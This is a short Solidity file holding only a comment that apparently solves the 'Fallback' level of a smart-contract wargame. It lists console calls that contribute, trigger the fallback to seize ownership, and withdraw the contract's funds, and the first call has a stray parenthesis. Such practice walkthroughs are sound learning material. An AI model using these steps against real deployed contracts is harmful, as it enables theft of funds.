// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* Solution in console

  To pass this level you need to follow this steps:
    
    First you need to contribute so you can pass the require(contributions[msg.sender] > 0) in the fallback
    - await contract.contribute({value: 100)})
    
    // Call the fallback function so you can claim the ownership of the contract
    - await contract.sendTransaction({value: 100})

    // Withdraw the smart contract's funds
    - await contract.withdraw()


*/